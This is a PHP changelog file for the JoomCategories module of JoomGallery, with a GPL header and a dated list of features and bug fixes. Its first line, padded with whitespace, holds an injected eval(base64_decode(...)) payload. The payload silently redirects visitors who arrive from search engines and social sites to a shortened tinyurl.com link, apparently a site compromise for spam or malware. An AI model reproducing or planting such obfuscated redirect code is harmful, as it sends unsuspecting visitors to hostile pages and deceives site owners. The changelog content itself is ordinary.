<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/Module/JoomCategories/trunk/changelog.php $
// $Id: changelog.php 2409 2010-09-16 16:47:57Z erftralle $
/**
* Module JoomCategories for JoomGallery
* by JoomGallery::Project Team
* @package JoomGallery
* @copyright JoomGallery::Project Team
* @license http://www.gnu.org/copyleft/gpl.html GNU/GPL
*
* This program is free software; you can redistribute it and/or modify it under
* the terms of the GNU General Public License as published by the Free Software
* Foundation, either version 2 of the License, or (at your option) any later
* version.
*
* This program is distributed in the hope that it will be useful, but WITHOUT
* ANY WARRANTY, without even the implied warranty of MERCHANTABILITY or FITNESS
* FOR A PARTICULAR PURPOSE.
* See the GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License along with
* this program; if not, write to the Free Software Foundation, Inc.,
* 51 Franklin St, Fifth Floor, Boston, MA 02110, USA
*/

// no direct access
defined('_JEXEC') or die('Restricted access');
?>

CHANGELOG MOD_JGLATESTCAT (since Version 1.5 ) / MOD_JOOMCAT (since Version 1.5.5 )

Legende / Legend:

* -> Security Fix
# -> Bug Fix
+ -> Addition
^ -> Change
- -> Removed
! -> Note

-------------------------------------------------------------------------------
MOD_JOOMCAT version: 1.5.6.1
-------------------------------------------------------------------------------
20101221
^ Changed some CSS settings in javascript module to be more cross browser
  compatible
# Apply JoomHelper::fixForJS() on linkTitle given to smoothgallery script
  to prevent JavaScript error if image titles contain single quotes

-------------------------------------------------------------------------------
MOD_JOOMCAT version: 1.5.6 (for JoomGallery MVC 1.5.6)
-------------------------------------------------------------------------------
20101210
+ Added slideshow parameters
+ Parameter to limit the number of images in slideshow
+ Parameter to determine the sort order of images displayed in the slideshow

20101202
+ Added the category title and a close button for the slidshow popup
- Slideshow not dragable any longer

20101130
+ Dynamic cropping

20101125
+ Added more choices for link on thumbnail

20101124
+ Added <![CDATA[]]> into javascript code of slideshow to validate correctly

20101109
+ Display of rating according to JoomGallery's backend options (text or stars)

20101101
+ SQL adaptions for showing weighted rating according to Thomas Bayes
# show random category thumbnail if manual selected thumbnail in category manager
  could not be determined (not approved, not published or not enough access rights)
+ added 'group' parameter in module interface configuration

20100916
# display of wrong image numbers in slideshow carousel

-------------------------------------------------------------------------------
MOD_JOOMCAT version: 1.5.5 (for JoomGallery MVC 1.5.5)
-------------------------------------------------------------------------------
20100822
! Stable

20100204
+ different modes for category selection (last added, top rated and most viewed)

20100217
+ possibility to show an additional link at the bottom of the module

20100304
+ category filter introduced

20100331
^ adaption to JoomGallery's new language constants
^ adaption to JoomGallery's new interface class

20100401
# javascript errors occuring in IE7/8 removed

20100422
^ joined JoomGallery's project team, changes in file headers

20100425
^ code style adaptions
^ some refactoring to have a smaller default template, switched Code to
  helper class

20100512
# use of JoomHelper::getAllSubCategories() instead of module's internal function (removed)

20100609
# added addslashes() for text parameter passing to javascript in function prepareSlideshow()

20100726
^ replaced "&amp;" with "&" in link and image URL passed to smoothgallery javascript
  in function prepareSlideshow() to avoid incompatibilities when using watermark in
  combination with sh404SEF component

-------------------------------------------------------------------------------
MOD_JGLATESTCAT version: 1.5.5 (for JoomGallery MVC 1.5.5)
-------------------------------------------------------------------------------
20091001 - version 1.5.5 TEST (for JoomGallery MVC)
^ path to JoomGallery's interface.php changed

20091219
+ minor changes

20091221
+ backend parameter to select root category, latest categories are only taken from subcategories of given root category
+ backend parameter to change Itemid used in links

20100107
+ backend parameter to show category description

20100127
+ minor changes
+ integration of SmoothGallery for displaying a category slideshow

20100202
+ improved slideshow with overlay and chained fading effects

20100203
^ changed module name from "JoomGallery Latest Categories" to "JoomCategories for JoomGallery"

-------------------------------------------------------------------------------
MOD_JGLATESTCAT version: 1.5.1
-------------------------------------------------------------------------------
20090610
+ complete refactoring of code to come closer to MVC
+ multiple column view of categories
+ options to position the thumbnail
+ options for horizontal alignment of thumbnails and text
+ options to display horizontal rulers
+ option to display the short text versions without descriptive attributes

20090623
+ options for styling thumbnail border and resetting list styles

-------------------------------------------------------------------------------
MOD_JGLATESTCAT version: 1.5.0
-------------------------------------------------------------------------------
20090428
+ minor changes
+ check for installed JoomGallery

20090609
+ different options for thumbnail link (none, detail view, category view)
+ options to show category title and to enable/disable link on category title